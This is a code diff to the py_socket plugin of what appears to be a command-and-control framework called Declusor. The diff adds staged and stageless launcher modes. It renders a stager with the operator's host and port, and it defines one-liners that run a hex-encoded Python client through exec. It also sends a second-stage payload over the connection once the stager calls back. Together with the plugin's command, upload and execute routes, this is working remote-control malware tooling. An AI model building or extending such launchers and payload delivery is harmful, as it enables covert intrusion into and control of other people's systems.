@@ -30,6 +30,7 @@ class PySocketPlugin(contract.IPluginExtension[PySocketConfig]):
     version = "1.0.0"
     author = "Declusor Team"
     options_type = PySocketConfig
+
     routes = {
         config.OfficialRoute.LOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.LOAD.value],
         config.OfficialRoute.COMMAND.value: core.OFFICIAL_ROUTES[config.OfficialRoute.COMMAND.value],
@@ -38,6 +39,13 @@ class PySocketPlugin(contract.IPluginExtension[PySocketConfig]):
         config.OfficialRoute.UPLOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.UPLOAD.value],
         config.OfficialRoute.EXECUTE.value: core.OFFICIAL_ROUTES[config.OfficialRoute.EXECUTE.value],
     }
+
+    supported_launcher_kinds: frozenset[config.LauncherKind] = frozenset(
+        {
+            config.LauncherKind.STAGED,
+            config.LauncherKind.STAGELESS,
+        }
+    )
 
     @classmethod
     def configure_parser(cls, parser: contract.IArgumentParser, /) -> None:
@@ -84,6 +92,12 @@ class PySocketPlugin(contract.IPluginExtension[PySocketConfig]):
         if not launcher_file.is_file():
             raise config.ParserError(f"Client launcher file does not exist: {launcher_file}")
 
+        if plugin_config.launcher_kind is config.LauncherKind.STAGED:
+            stager_file = plugin_config.filesystem.launchers / "py_socket_stager.py"
+
+            if not stager_file.is_file():
+                raise config.ParserError(f"Stager launcher file does not exist: {stager_file}")
+
     @classmethod
     def build_runtime(cls, plugin_config: contract.PluginConfig[PySocketConfig], /) -> contract.IPluginRuntime:
         """Build the py_socket runtime from client configuration."""
@@ -95,6 +109,7 @@ class PySocketRuntime(contract.IPluginRuntime):
     """Runtime adapter between Python client configuration and its transport."""
 
     DEFAULT_WRAPPER_TEMPLATE: Final[str] = "python3 -c 'exec(bytes.fromhex(\"$DECLUSOR_SCRIPT\"))'"
+    STAGED_WRAPPER_TEMPLATE: Final[str] = "python3 -c '$DECLUSOR_SCRIPT'"
 
     def __init__(self, plugin_config: contract.PluginConfig[PySocketConfig], /) -> None:
         self._plugin_config = plugin_config
@@ -112,19 +127,34 @@ class PySocketRuntime(contract.IPluginRuntime):
     def launcher(self) -> contract.LauncherDelivery:
         """Return the rendered Python client launcher delivery envelope."""
 
+        kind = self._plugin_config.launcher_kind
         rendered_bytes = self._processor.render_launcher(
             self._plugin_config.host,
             self._plugin_config.port,
             self._expected_ack,
+            kind=kind,
         )
+
+        wrapper = self.STAGED_WRAPPER_TEMPLATE if kind is config.LauncherKind.STAGED else self.DEFAULT_WRAPPER_TEMPLATE
 
         return contract.LauncherDelivery(
             script=rendered_bytes,
-            wrapper_template=self.DEFAULT_WRAPPER_TEMPLATE,
+            wrapper_template=wrapper,
+            kind=kind,
         )
 
     def create_connection(self, transport: contract.ITransport, /) -> contract.IConnection:
         """Create a py_socket connection for an accepted transport channel."""
+
+        stage1_payload: bytes | None = None
+        if self._plugin_config.launcher_kind is config.LauncherKind.STAGED:
+            stageless_bytes = self._processor.render_launcher(
+                self._plugin_config.host,
+                self._plugin_config.port,
+                self._expected_ack,
+                kind=config.LauncherKind.STAGELESS,
+            )
+            stage1_payload = bytes.fromhex(stageless_bytes.decode("ascii"))
 
         return PySocketConnection(
             transport,
@@ -132,6 +162,7 @@ class PySocketRuntime(contract.IPluginRuntime):
             self._processor,
             expected_ack=self._expected_ack,
             timeout=self._plugin_config.timeout or config.DEFAULT_CONNECTION_TIMEOUT,
+            stage1_payload=stage1_payload,
         )
 
 
@@ -166,8 +197,34 @@ class PySocketProcessor(contract.IPluginProcessor):
 
         return b"\n\n".join(all_helpers.values())
 
-    def render_launcher(self, host: str, port: int, acknowledge: bytes, /) -> bytes:
-        """Read, interpolate, sanitize, and hex-encode the client launcher script."""
+    def render_launcher(
+        self,
+        host: str,
+        port: int,
+        acknowledge: bytes,
+        /,
+        *,
+        kind: config.LauncherKind = config.LauncherKind.STAGELESS,
+    ) -> bytes:
+        """Read, interpolate, sanitize, and return client launcher script."""
+
+        if kind is config.LauncherKind.STAGED:
+            stager_path = self._filesystem.launchers / "py_socket_stager.py"
+
+            try:
+                stager_template = stager_path.read_text(encoding="utf-8")
+            except OSError as error:
+                raise config.ConnectionError(f"Failed to read stager script: {error}") from error
+
+            rendered = util.format_template(
+                stager_template,
+                HOST=host,
+                PORT=str(port),
+                DECLUSOR_HOST=host,
+                DECLUSOR_PORT=str(port),
+            )
+
+            return rendered.strip().encode("utf-8")
 
         launcher_path = self._filesystem.launchers / "py_socket_client.py"
 
